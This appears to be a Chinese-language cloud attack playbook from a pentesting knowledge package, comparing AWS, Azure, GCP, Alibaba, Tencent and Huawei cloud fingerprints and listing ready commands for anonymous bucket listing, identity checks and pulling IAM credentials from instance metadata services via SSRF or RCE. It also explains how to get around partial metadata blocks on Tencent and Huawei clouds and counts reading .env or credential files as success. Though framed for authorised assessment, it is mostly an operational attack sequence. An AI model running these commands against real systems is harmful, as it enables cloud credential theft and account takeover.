# 多云资产与攻击面概览（六云对比）

> 适用：授权评估中手里只有域名、一小段 URL 或一串密钥，需要先判定"这是哪朵云、哪个服务、下一枪打哪"的场景。

## 认什么

**六云对比表**（元数据地址与凭据前缀是判云的硬指纹；域名可被 CNAME/CDN 代理，只能作辅证）

| 云 | 资产形态 | 强指纹 | 元数据地址 | 凭据前缀/形态 | 默认入口 |
|---|---|---|---|---|---|
| AWS | S3、EC2、Lambda、API Gateway、CloudFront、Cognito | `*.s3.amazonaws.com`、`{id}.execute-api.{region}.amazonaws.com`、`{id}.cloudfront.net`、`{id}.lambda-url.{region}.on.aws`、响应头 `x-amz-*` | `169.254.169.254/latest/meta-data/`（IMDSv1 直 GET；IMDSv2 先 PUT `/latest/api/token`） | `AKIA` 长期 / `ASIA` 临时 + SessionToken | S3 匿名 `--no-sign-request`、Cognito Identity Pool、Lambda Function URL |
| Azure | Blob、App Service、VM、Functions、Key Vault、SQL | `*.blob.core.windows.net`、`*.azurewebsites.net`、`*.scm.azurewebsites.net`、`*.vault.azure.net`、`*.database.windows.net`、响应头 `x-ms-*` | `169.254.169.254/metadata/instance?api-version=2021-02-01`，必须带 `Metadata: true` | 用户 UPN `user@tenant.onmicrosoft.com`、SP `client_id`(GUID)+secret/证书、Token `eyJ0...`、Refresh `0.ARMA...`、SAS `sig=` | tenant 枚举 `login.microsoftonline.com/<domain>/.well-known/openid-configuration`、Blob 容器 list |
| GCP | GCS、Cloud Run、App Engine、Cloud Functions、Firebase、GKE | `storage.googleapis.com`、`{svc}-{hash}.a.run.app`、`{project}.appspot.com`、`{region}-{project}.cloudfunctions.net`、响应头 `x-goog-*` | `metadata.google.internal/computeMetadata/v1/`，必须带 `Metadata-Flavor: Google` | SA JSON（`"type": "service_account"` + `private_key`）、OAuth `ya29.`、OIDC JWT、HMAC Key | GCS 匿名 list、`{project}.firebaseio.com/.json` |
| 阿里云 | OSS、ECS、FC、ACK、SLB、RDS | `{bucket}.oss-{region}.aliyuncs.com`（内网 `-internal`）、响应头 `x-oss-*` | `100.100.100.200/latest/meta-data/`（GET 直连，不强制 Token） | `LTAI` 长期 / `STS.` 临时 + SecurityToken | OSS `/?list-type=2`、RAM/ECS OpenAPI |
| 腾讯云 | COS、CVM、SCF、TKE、CLB、TencentDB | `{bucket}-{appid}.cos.{region}.myqcloud.com`、`metadata.tencentyun.com`、响应头 `x-cos-*` / `Server: tencent-cos` | `metadata.tencentyun.com/latest/meta-data/`（域名形态）或 `169.254.0.23`（不强制 Token） | `AKID` 开头 SecretId（36 字符）/ TmpSecretId + Token | COS `/?list-type=2`、CAM OpenAPI |
| 华为云 | OBS、ECS、CCE、RDS、FunctionGraph、ELB | `{bucket}.obs.{region}.myhuaweicloud.com`、IAM 响应头 `X-Subject-Token`、Keystone `/v3/auth/tokens` | `169.254.169.254/openstack/latest/`（OpenStack 路径，`securitykey` 取凭据） | 长期 AK/SK（约 20 字符，无固定前缀）+ `X-Auth-Token` 24h | OBS `/?max-keys=10`、IAM v3 tokens |

**C 段不可作判据**：云 IP 的 /24 会被 CDN、WAF、其他租户复用，同一 C 段既可能是目标也可能是别人；只有域名后缀、响应头、元数据可达性算强证据。判云顺序固定为"域名 → 响应头 → 元数据"，不靠 IP 归属猜。

**首枪顺序（六云通用）**

1. 有域名/URL：抓响应头与错误页定云定服务（S3 XML 错误、`cos`/`oss`/`obs` 域名、Azure 的 `Metadata` 400 提示都是线索）。
2. 无凭据：先打对象存储匿名面（六个 list 变体见下）→ 读桶内 README/配置/备份，常能反查出内部桶名与凭据。
3. 有 SSRF：按云打元数据。能否成取决于要不要自定义 Header——AWS IMDSv2 要 PUT + Header、Azure 要 `Metadata: true`、GCP 要 `Metadata-Flavor: Google`；阿里云、腾讯云不要 Header。
4. 有凭据：先做身份确认（各云 GetCallerIdentity 等价命令），再枚举策略/资源。
5. 提权看身份层本身（IAM/RAM/CAM/Keystone/Entra）；横向看信任策略与角色链。

## 打哪（命令）

```bash
# 1) 判云：响应头 + 域名
curl -sI https://target.example | grep -iE 'x-amz|x-ms|x-goog|x-oss|x-cos|x-obs|server'
# Azure tenant 定位
curl -s "https://login.microsoftonline.com/target.example/.well-known/openid-configuration" | jq -r '.token_endpoint'

# 2) 六个匿名桶探测（无凭据也先打）
aws s3 ls s3://BUCKET --no-sign-request
curl -s "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"
curl -s "https://storage.googleapis.com/BUCKET"
curl -s "https://BUCKET.oss-cn-hangzhou.aliyuncs.com/?list-type=2"
curl -s "https://BUCKET-APPID.cos.ap-guangzhou.myqcloud.com/?list-type=2"
curl -s "https://BUCKET.obs.cn-north-4.myhuaweicloud.com/?max-keys=10"

# 3) 六个身份确认
aws sts get-caller-identity
az account show
gcloud auth list
aliyun sts GetCallerIdentity
tccli sts GetCallerIdentity
openstack token issue
```

**元数据速取（有 SSRF/RCE 时按云选路径）**

```bash
# AWS IMDSv2
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Azure
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# GCP
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# 阿里云
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/
# 腾讯云
curl -s http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
# 华为云
curl -s http://169.254.169.254/openstack/latest/securitykey
```

## 什么算成

- 能同时说出"云厂商 + 具体服务 + 可复现入口"（例：阿里云 OSS 某桶匿名可列），而不是"疑似某云"。
- 匿名桶读到内部对象内容（备份、`.env`、凭据文件），或证明桶 ACL/策略可写。
- 元数据返回 role 名与凭据三元组，且该凭据能调通云 API（换身份成功）。
- 判云结论有第二个独立指纹交叉验证：域名后缀、响应头、元数据路径三者至少命中两条。

## 假点

- 域名 CNAME 到 `*.amazonaws.com` / `*.aliyuncs.com` 只说明用了该云的 CDN 或托管，不代表有桶或实例暴露。
- 桶首页 200 但 `list-type=2` 空/仅静态站，等于没有列出权限。
- 元数据超时或被拒是网络与 Header 问题，不是"云环境打不动"；换路径、换 Header、换出口后仍失败才停。
- Azure 不带 `Metadata: true` 返回 400、GCP 不带 `Metadata-Flavor: Google` 返回 403，都属协议要求，别当成防护生效。
- 身份确认成功但后续全部 AccessDenied：只证明凭据有效，不构成接管。
- 两个高频误判：腾讯云只封 `169.254.169.254` 挡不住 `metadata.tencentyun.com`；华为云只封 `/latest/meta-data/` 挡不住 `/openstack/latest/`。

## 与其他包联动

- 云元数据 × SSRF 完整打法：`../../web-ssrf-render/knowledge/ssrf-internal-network-02-二、云元数据-打内网核心.md`
- 密钥从 JS/配置还原与鉴权证伪：`../../web-recon/knowledge/unauth-path-key-hunt-07-P4-密钥还原与鉴权证伪.md`
- 入门级对象存储/IMDS/云函数：本包 `对象存储与云元数据实战.md`
- 单云深入：`cloud-02-AWS攻击面与IAM提权.md`、`cloud-03-Azure与GCP.md`、`cloud-04-国内云.md`、`cloud-05-云凭据-IAM-元数据.md`
- 战法定位：`../../ck-router/knowledge/战法索引-04-云与内网.md`；报告口径：`../../../../rules/40-evidence-report.md`
